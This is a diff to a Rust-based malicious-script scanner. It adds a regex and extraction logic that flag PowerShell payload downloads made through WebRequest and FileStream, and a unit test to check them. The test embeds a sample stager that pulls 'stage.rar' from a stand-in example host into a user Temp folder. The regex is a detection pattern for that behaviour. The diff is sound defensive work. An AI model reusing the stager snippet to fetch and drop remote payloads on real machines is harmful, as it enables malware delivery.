@@ -112,6 +112,14 @@ static DOWNLOADFILE_PATH_COMBINE_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static WEBREQUEST_FILESTREAM_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)\[(?:System\.)?Net\.WebRequest\]::Create\s*\(\s*["']([^"']+)["']\s*\).*?GetResponseStream\s*\(\s*\).*?New-Object\s+(?:System\.)?IO\.FileStream\s*\(\s*["']([^"']+)["']\s*,\s*\[(?:System\.)?IO\.FileMode\]::Create"#,
+    )
+    .expect("webrequest filestream download")
+});
+
+#[allow(clippy::expect_used)]
 static DOWNLOADSTRING_FRAGMENT_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r#"(?i)\b(?:loadString|ADSTRING)\s*\(\s*'{1,2}(https?://[^'")]+)"#)
         .expect("downloadstring fragment")
@@ -9309,6 +9317,31 @@ pub(crate) fn ps_downloadfile_calls(text: &str) -> Vec<(String, Option<String>)>
     out
 }
 
+fn ps_webrequest_filestream_downloads(text: &str) -> Vec<(String, String)> {
+    if !contains_ascii_case_insensitive_bytes(text, b"webrequest")
+        || !contains_ascii_case_insensitive_bytes(text, b"filestream")
+        || !contains_ascii_case_insensitive_bytes(text, b"getresponsestream")
+    {
+        return Vec::new();
+    }
+
+    let mut out = Vec::new();
+    let mut seen = std::collections::HashSet::new();
+    for caps in WEBREQUEST_FILESTREAM_RE.captures_iter(text) {
+        let (Some(url), Some(dst)) = (caps.get(1), caps.get(2)) else {
+            continue;
+        };
+        let Some(src) = normalize_ps_download_url(url.as_str()) else {
+            continue;
+        };
+        let dst = dst.as_str().to_string();
+        if seen.insert((src.clone(), dst.clone())) {
+            out.push((src, dst));
+        }
+    }
+    out
+}
+
 pub(crate) fn ps_download_side_effects(text: &str) -> Vec<(String, String)> {
     let mut out = Vec::new();
     let mut seen = std::collections::HashSet::new();
@@ -9317,6 +9350,12 @@ pub(crate) fn ps_download_side_effects(text: &str) -> Vec<(String, String)> {
         let Some(dst) = dst else {
             continue;
         };
+        if seen.insert((src.clone(), dst.clone())) {
+            out.push((src, dst));
+        }
+    }
+
+    for (src, dst) in ps_webrequest_filestream_downloads(text) {
         if seen.insert((src.clone(), dst.clone())) {
             out.push((src, dst));
         }
@@ -10133,6 +10172,21 @@ pub fn scan_ps1_payloads(env: &mut Environment) {
             dynamic_elapsed += stage_start.elapsed();
 
             let stage_start = std::time::Instant::now();
+            for (url, dst) in ps_webrequest_filestream_downloads(text) {
+                if !seen.insert((idx, url.clone())) {
+                    continue;
+                }
+                push_download_and_execution_url_argument(
+                    env,
+                    command_context.clone(),
+                    url,
+                    Some(dst),
+                    primary,
+                );
+            }
+            dynamic_elapsed += stage_start.elapsed();
+
+            let stage_start = std::time::Instant::now();
             let regex_atom_profile = PsUrlRegexAtomProfile::new(text);
             for spec in PS_URL_REGEX_SPECS {
                 if !regex_atom_profile.matches(spec.atom_kind) {
@@ -10733,6 +10787,38 @@ iwr $url"#;
                     if src == "https://ps-extractor-var-url.example/stage.ps1"
             )),
             "PS extractor-assigned URL was not surfaced as a download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn webrequest_filestream_download_destination_is_extracted() {
+        let script = br#"
+$request = [System.Net.WebRequest]::Create('https://ps-webrequest-filestream.example/stage.rar')
+$response = $request.GetResponse()
+$responseStream = $response.GetResponseStream()
+$fileStream = New-Object System.IO.FileStream('C:\Users\puncher\AppData\Local\Temp\stage.rar', [System.IO.FileMode]::Create)
+[byte[]]$buffer = New-Object byte[] 1024
+while(($bytesRead = $responseStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
+    $fileStream.Write($buffer, 0, $bytesRead)
+}
+"#;
+        let mut env = Environment::new(&Config::default());
+        env.all_extracted_ps1.push(script.to_vec());
+
+        super::scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download {
+                    src,
+                    dst: Some(dst),
+                    ..
+                } if src == "https://ps-webrequest-filestream.example/stage.rar"
+                    && dst == "C:\\Users\\puncher\\AppData\\Local\\Temp\\stage.rar"
+            )),
+            "WebRequest/FileStream destination was not surfaced: {:?}",
             env.traits
         );
     }
